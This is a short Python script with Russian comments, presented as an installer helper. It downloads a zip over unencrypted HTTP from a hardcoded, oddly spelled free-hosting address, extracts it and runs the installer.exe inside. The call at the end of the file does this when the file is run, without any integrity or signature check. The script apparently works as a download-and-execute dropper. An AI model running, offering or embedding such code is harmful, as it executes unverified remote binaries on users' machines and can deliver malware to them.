import os
import tempfile
import requests
import zipfile
import subprocess

def download_and_install(url, filename="installer.zip", installer_name="installer.exe"):
    # Создаем временную папку
    with tempfile.TemporaryDirectory() as temp_dir:
        print(f"Временная папка: {temp_dir}")

        # Скачиваем файл
        print(f"Скачивание архива с {url}...")
        response = requests.get(url)
        response.raise_for_status()

        archive_path = os.path.join(temp_dir, filename)
        with open(archive_path, "wb") as f:
            f.write(response.content)
        print(f"Архив сохранен в {archive_path}")

        # Распаковываем архив
        print(f"Распаковка архива в {temp_dir}...")
        with zipfile.ZipFile(archive_path, "r") as zip_ref:
            zip_ref.extractall(temp_dir)
        print("Распаковка завершена.")

        # Ищем и запускаем installer.exe
        installer_path = os.path.join(temp_dir, installer_name)
        if os.path.exists(installer_path):
            print(f"Запуск {installer_name}...")
            subprocess.run([installer_path], check=True)
        else:
            print(f"Файл {installer_name} не найден в архиве.")

# Пример использования
url = "http://displayerappp.wuaze.com/release/installer.zip"  # Замените на нужный URL
download_and_install(url)
